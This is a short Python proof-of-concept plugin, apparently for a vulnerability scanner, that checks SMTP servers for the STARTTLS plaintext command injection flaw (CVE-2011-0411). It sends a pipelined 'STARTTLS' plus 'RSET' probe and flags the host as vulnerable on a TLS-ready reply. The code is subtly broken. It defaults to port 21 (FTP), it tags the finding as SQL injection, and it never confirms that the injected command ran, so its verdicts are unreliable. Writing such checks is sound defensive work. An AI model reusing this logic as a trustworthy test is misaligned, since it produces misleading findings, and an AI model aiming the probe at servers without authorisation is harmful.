# Author:w8ay
# Name:测试DEMO
'''
name: smtp starttls明文命令注入(CVE-2011-0411)
referer: http://www.securityfocus.com/archive/1/516901/30/0/threaded
author: Lucifer
description: smtp starttls明文命令注入漏洞可以使攻击者通过发送明文命令注入到加密的SMTP会话，此会话经过TLS处理会造成中间人攻击。
'''

import socket


def poc(arg, **kwargs):
    host = kwargs.get("ip",None)
    port = kwargs.get("port",21)
    if host is None:
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        s.recv(1024).decode()
        s.send(b"STARTTLS\r\nRSET\r\n")
        result = s.recv(1024).decode()
        s.close()
        if r"220 Ready to start TLS" in result:
            result = {
                "name": "CVE-2011-0411",  # 插件名称
                "content": "smtp starttls明文命令注入(CVE-2011-0411),攻击者通过发送明文命令注入到加密的SMTP会话，此会话经过TLS处理会造成中间人攻击。",  # 插件返回内容详情，会造成什么后果。
                "url": "{}:{}".format(host,port),  # 漏洞存在url
                "log": {
                },
                "tag": "sqli_inject"  # 漏洞标签
            }
            return result

    except:
        pass




if __name__ == "__main__":
    pass